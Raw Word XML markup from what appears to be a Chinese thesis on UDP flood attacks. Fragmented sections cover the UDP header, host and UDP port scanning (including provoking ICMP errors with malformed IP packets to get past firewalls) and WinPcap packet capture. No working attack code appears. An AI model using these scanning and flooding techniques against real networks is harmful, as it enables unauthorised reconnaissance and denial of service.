        <w:tblpPr w:leftFromText="182" w:rightFromText="182" w:vertAnchor="text" w:horzAnchor="page" w:tblpXSpec="center"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1317"/>
        <w:gridCol w:w="1176"/>
        <w:gridCol w:w="696"/>
        <w:gridCol w:w="1176"/>
      </w:tblGrid>
      <w:tr w:rsidR="008B0625" w:rsidRPr="00E90326" w14:paraId="3A946F8A" w14:textId="77777777" w:rsidTr="003C22FC">
        <w:trPr>
          <w:trHeight w:val="302"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>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0" w:type="auto"/>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0" w:type="auto"/>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0" w:type="auto"/>
            <w:gridSpan w:val="2"/>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3C22FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>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0" w:type="auto"/>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0" w:type="auto"/>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3C22FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>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0" w:type="auto"/>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0" w:type="auto"/>
            <w:gridSpan w:val="2"/>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3C22FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="5"/>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3C22FC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="5"/>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3C22FC">
        <w:trPr>
          <w:trHeight w:val="579"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="4"/>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0" w:type="auto"/>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3C22FC">
        <w:trPr>
          <w:trHeight w:val="557"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="5"/>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0249EC28" w14:textId="65146156"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0592B6EE"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986" w:name="_Hlt270202144"/>
      <w:bookmarkStart w:id="987" w:name="_Toc482141229"/>
      <w:bookmarkStart w:id="988" w:name="_Toc482141902"/>
      <w:bookmarkStart w:id="989" w:name="_Toc482522612"/>
      <w:bookmarkEnd w:id="986"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>UDP协议</w:t>
      </w:r>
      <w:bookmarkEnd w:id="987"/>
      <w:bookmarkEnd w:id="988"/>
      <w:bookmarkEnd w:id="989"/>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control），需要基于网络的机制来减少因失控和高速UDP流量负荷而导致的拥塞崩溃效应。换句话说，因为UDP发送者不能够检测拥塞，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>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6D7546CD" w:rsidR="00AD16B6" w:rsidRPr="008D0F3E" w:rsidRDefault="00AD16B6" w:rsidP="00E70858">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>表2</w:t>
      </w:r>
      <w:r w:rsidR="009A0F67" w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 表2- \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">UDP </w:t>
      </w:r>
      <w:r w:rsidRPr="008D0F3E">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>报头</w:t>
      </w:r>
      <w:ins w:id="990" w:author="renxt" w:date="2017-05-13T20:54:00Z">
        <w:r w:rsidR="00140975">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia" w:hint="eastAsia"/>
            <w:sz w:val="21"/>
            <w:szCs w:val="21"/>
          </w:rPr>
          <w:t>（表格能打印出来吗？以下对吗？参考计算机网络重画。这是图不是表）</w:t>
        </w:r>
      </w:ins>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28D18E7C" w14:textId="1107B898" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidRDefault="00586B56" w:rsidP="00EB34D2">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="991" w:name="_Toc482141230"/>
      <w:bookmarkStart w:id="992" w:name="_Toc482141903"/>
      <w:bookmarkStart w:id="993" w:name="_Toc482522613"/>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lood攻击相关技术</w:t>
      </w:r>
      <w:bookmarkEnd w:id="991"/>
      <w:bookmarkEnd w:id="992"/>
      <w:bookmarkEnd w:id="993"/>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994" w:name="_Toc482141231"/>
      <w:bookmarkStart w:id="995" w:name="_Toc482141904"/>
      <w:bookmarkStart w:id="996" w:name="_Toc482522614"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>主机扫描</w:t>
      </w:r>
      <w:bookmarkEnd w:id="994"/>
      <w:bookmarkEnd w:id="995"/>
      <w:bookmarkEnd w:id="996"/>
    </w:p>
    <w:p w14:paraId="11FB54E6" w14:textId="20FF2B05"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w:t>
      </w:r>
      <w:r w:rsidR="004F1163">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>防火墙都对Ping做了限制，如果透过防火墙，需要利用高级ICMP扫描技术。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71F4A4C3" w14:textId="53673A51"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w:t>
      </w:r>
      <w:r w:rsidR="009A0F67">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">UX等，是不会发送ICMP的Unreachable数据报的。主要可以利用下列这些特性：1、向目标主机发送一个只有IP头的IP数据包，目标将返回Destination Unreachable的ICMP错误报文。2、向目标主机发送一个坏IP数据报，比如，不正确的IP头长度，目标主机将返回Parameter </w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>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36E9D2DD"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997" w:name="_Toc482141232"/>
      <w:bookmarkStart w:id="998" w:name="_Toc482141905"/>
      <w:bookmarkStart w:id="999" w:name="_Toc482522615"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>UDP端口扫描</w:t>
      </w:r>
      <w:bookmarkEnd w:id="997"/>
      <w:bookmarkEnd w:id="998"/>
      <w:bookmarkEnd w:id="999"/>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37E8F9C5" w:rsidR="00737214" w:rsidRPr="00E90326" w:rsidRDefault="00353D58" w:rsidP="00353D58">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>(1)</w:t>
      </w:r>
      <w:r w:rsidR="00737214" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>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27D8F255" w:rsidR="00737214" w:rsidRPr="00E90326" w:rsidRDefault="00353D58" w:rsidP="00353D58">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>(2)</w:t>
      </w:r>
      <w:r w:rsidR="00737214" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>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lastRenderedPageBreak/>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5BDD9D2" w:rsidR="00737214" w:rsidRPr="00E90326" w:rsidRDefault="002963B1" w:rsidP="002963B1">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>(3)</w:t>
      </w:r>
      <w:r w:rsidR="00737214" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>高级UDP扫描技术</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D09CE6" w14:textId="4E79C3EA" w:rsidR="001B5590" w:rsidRPr="005F1439" w:rsidRDefault="00737214" w:rsidP="005F1439">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F4FC003" w14:textId="159EF9C2"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1000" w:name="_Toc482141233"/>
      <w:bookmarkStart w:id="1001" w:name="_Toc482141906"/>
      <w:bookmarkStart w:id="1002" w:name="_Toc482522616"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>UDP F</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>lood攻击</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1000"/>
      <w:bookmarkEnd w:id="1001"/>
      <w:bookmarkEnd w:id="1002"/>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6CC2821A" w14:textId="0C33B5D3" w:rsidR="001B5590" w:rsidRPr="00E90326" w:rsidRDefault="00026882" w:rsidP="009406A0">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w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>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bookmarkStart w:id="1003" w:name="_Toc482141234"/>
      <w:bookmarkStart w:id="1004" w:name="_Toc482141907"/>
      <w:bookmarkStart w:id="1005" w:name="_Toc482522617"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>SOCKET编程原理</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1003"/>
      <w:bookmarkEnd w:id="1004"/>
      <w:bookmarkEnd w:id="1005"/>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4FD5C75C"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bookmarkStart w:id="1006" w:name="_Toc482141235"/>
      <w:bookmarkStart w:id="1007" w:name="_Toc482141908"/>
      <w:bookmarkStart w:id="1008" w:name="_Toc482522618"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Socket的结构组成</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1006"/>
      <w:bookmarkEnd w:id="1007"/>
      <w:bookmarkEnd w:id="1008"/>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w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>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5A50F66B"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bookmarkStart w:id="1009" w:name="_Toc482141236"/>
      <w:bookmarkStart w:id="1010" w:name="_Toc482141909"/>
      <w:bookmarkStart w:id="1011" w:name="_Toc482522619"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Socket</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>网络编程技术主机扫描</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1009"/>
      <w:bookmarkEnd w:id="1010"/>
      <w:bookmarkEnd w:id="1011"/>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13D5D971" w14:textId="7FE7CDAA" w:rsidR="006F7ADB" w:rsidRPr="00E90326" w:rsidRDefault="00A7071C" w:rsidP="00414AC5">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1012" w:name="_Hlt270204733"/>
      <w:bookmarkEnd w:id="1012"/>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1013" w:name="_Toc452322118"/>
      <w:bookmarkStart w:id="1014" w:name="_Toc453078656"/>
      <w:bookmarkStart w:id="1015" w:name="_Toc482141237"/>
      <w:bookmarkStart w:id="1016" w:name="_Toc482141910"/>
      <w:bookmarkStart w:id="1017" w:name="_Toc482522620"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>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1013"/>
      <w:bookmarkEnd w:id="1014"/>
      <w:bookmarkEnd w:id="1015"/>
      <w:bookmarkEnd w:id="1016"/>
      <w:bookmarkEnd w:id="1017"/>
    </w:p>
    <w:p w14:paraId="20100271" w14:textId="227D82B4" w:rsidR="00743A4F" w:rsidRPr="00E90326" w:rsidRDefault="00EE4BE3" w:rsidP="00276C0B">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1018" w:name="_Toc482141238"/>
      <w:bookmarkStart w:id="1019" w:name="_Toc482141911"/>
      <w:bookmarkStart w:id="1020" w:name="_Toc482522621"/>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w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>简介</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1018"/>
      <w:bookmarkEnd w:id="1019"/>
      <w:bookmarkEnd w:id="1020"/>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1B28EA57"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1021" w:name="_Toc482141239"/>
      <w:bookmarkStart w:id="1022" w:name="_Toc482141912"/>
      <w:bookmarkStart w:id="1023" w:name="_Toc482522622"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>基于</w:t>
      </w:r>
      <w:r w:rsidR="00CF705F" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r w:rsidR="00CF705F"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bookmarkEnd w:id="1021"/>
      <w:bookmarkEnd w:id="1022"/>
      <w:bookmarkEnd w:id="1023"/>
    </w:p>
    <w:p w14:paraId="4B50361C" w14:textId="20699F6D" w:rsidR="009D25BC" w:rsidRPr="00E90326" w:rsidRDefault="009D25BC" w:rsidP="00173457">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w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>也很方便程序员进行开发。很多不同的工具软件使用Winpcap于网络分析，故障排除，网络安全监控等方面。Winpcap</w:t>
      </w:r>
      <w:r w:rsidR="00173457">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
        <w:t>可以对以下领域进行相关软件的开发</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
        <w:t>网络及协议分析、网络监控、通信日志记录、traffic generators、用户级别的桥路和路由、网络入侵检测系统（NIDS）、网络扫描、安全工具</w:t>
      </w:r>
      <w:r w:rsidR="00173457">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C477AA4" w14:textId="3EC03E66" w:rsidR="00EE4BE3" w:rsidRPr="00E90326" w:rsidRDefault="009D25BC" w:rsidP="00551BDD">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251AA61" w14:textId="4069530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1024" w:name="_Toc482141240"/>
      <w:bookmarkStart w:id="1025" w:name="_Toc482141913"/>
      <w:bookmarkStart w:id="1026" w:name="_Toc482522623"/>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bookmarkEnd w:id="1024"/>
      <w:bookmarkEnd w:id="1025"/>
      <w:bookmarkEnd w:id="1026"/>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负责捕获数据包。它与pcap_dispatch()的功能十分相似，区别就是 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554707" w:rsidP="009D25BC">
      <w:pPr>
        <w:spacing w:before="120" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:cs="Calibri"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId30"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1027" w:name="_Toc482141241"/>
      <w:bookmarkStart w:id="1028" w:name="_Toc482141914"/>
      <w:bookmarkStart w:id="1029" w:name="_Toc482522624"/>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bookmarkEnd w:id="1027"/>
      <w:bookmarkEnd w:id="1028"/>
      <w:bookmarkEnd w:id="1029"/>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0771022"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009D25BC"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lastRenderedPageBreak/>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2863233F"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w:t>
      </w:r>
      <w:r w:rsidR="009D25BC" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
        <w:t>打开适配器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DE08D7" w14:textId="1858F913"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w:t>
      </w:r>
      <w:r w:rsidR="009A0F67">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="16"/>
        </w:rPr>
        <w:t>&gt;name,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44722E36"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009D25BC"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t>传递给 pcap_compile() 的过滤器是"ip and tcp"，这说明我们只希望保留IPv4和TCP的数据包，并把他们发送给应用程序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F5AE09" w14:textId="38D033CA" w:rsidR="009D25BC" w:rsidRPr="00E90326" w:rsidRDefault="00083E48"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009D25BC"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bookmarkStart w:id="1030" w:name="_Toc482141242"/>
      <w:bookmarkStart w:id="1031" w:name="_Toc482141915"/>
      <w:bookmarkStart w:id="1032" w:name="_Toc482522625"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>本章小结</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1030"/>
      <w:bookmarkEnd w:id="1031"/>
      <w:bookmarkEnd w:id="1032"/>
    </w:p>
    <w:p w14:paraId="177947DD" w14:textId="25D2A6EC" w:rsidR="00632AFB" w:rsidRPr="00500677" w:rsidRDefault="00D97809" w:rsidP="00500677">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="432" w:firstLine="408"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorEastAsia" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorEastAsia"/>
        </w:rPr>
        <w:sectPr w:rsidR="00632AFB" w:rsidRPr="00500677" w:rsidSect="00EC15F4">
          <w:headerReference w:type="default" r:id="rId31"/>
          <w:pgSz w:w="11906" w:h="16838"/>
          <w:pgMar w:top="1701" w:right="1418" w:bottom="1418" w:left="1418" w:header="1134" w:footer="992" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="326"/>
        </w:sect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1033" w:name="_Hlt273261554"/>
      <w:bookmarkStart w:id="1034" w:name="_Hlt273463971"/>
      <w:bookmarkStart w:id="1035" w:name="_Hlt279679428"/>
      <w:bookmarkStart w:id="1036" w:name="_Toc482141243"/>
      <w:bookmarkStart w:id="1037" w:name="_Toc482141916"/>
      <w:bookmarkStart w:id="1038" w:name="_Toc482522626"/>
      <w:bookmarkEnd w:id="1033"/>
      <w:bookmarkEnd w:id="1034"/>
      <w:bookmarkEnd w:id="1035"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>概要设计</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1036"/>
      <w:bookmarkEnd w:id="1037"/>
      <w:bookmarkEnd w:id="1038"/>
    </w:p>
    <w:p w14:paraId="329FAC14" w14:textId="123B4458" w:rsidR="00150B71" w:rsidRPr="00E90326" w:rsidRDefault="002F0711" w:rsidP="00F91F18">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1039" w:name="_Toc482141244"/>
      <w:bookmarkStart w:id="1040" w:name="_Toc482141917"/>
      <w:bookmarkStart w:id="1041" w:name="_Toc482522627"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>设计初衷</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1039"/>
      <w:bookmarkEnd w:id="1040"/>
      <w:bookmarkEnd w:id="1041"/>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596B1B" w:rsidRDefault="009A4692" w:rsidP="00F91F18">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1042" w:name="_Toc482141245"/>
      <w:bookmarkStart w:id="1043" w:name="_Toc482141918"/>
      <w:bookmarkStart w:id="1044" w:name="_Toc482522628"/>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
